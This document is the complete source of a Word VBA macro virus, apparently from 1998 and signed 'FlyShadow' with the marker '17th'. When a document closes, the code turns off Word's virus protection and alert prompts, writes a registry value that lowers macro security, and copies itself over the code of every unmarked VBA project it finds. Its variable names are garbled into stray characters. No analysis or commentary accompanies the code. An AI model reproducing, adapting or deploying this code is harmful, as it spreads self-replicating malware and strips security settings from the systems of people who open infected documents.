'Copyright (C) 1998 by FlyShadow ~^^~ - 17th
Private Sub Document_Close()
On Error Resume Next
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Application.DisplayAlerts = 0
Application.ScreenUpdating = 0
Application.EnableCancelKey = 0
System.PrivateProfileString("","HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security","Level") = 1&
For Each �\ In VBE.VBProjects
If �\.Protection <> 1 And �\.Description <> "17th" Then
�\.Description = "17th" 
With �\.VBComponents(1).CodeModule
.DeleteLines 1, .CountOfLines
.AddFromString ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 17)
End With: End If: Next
End Sub
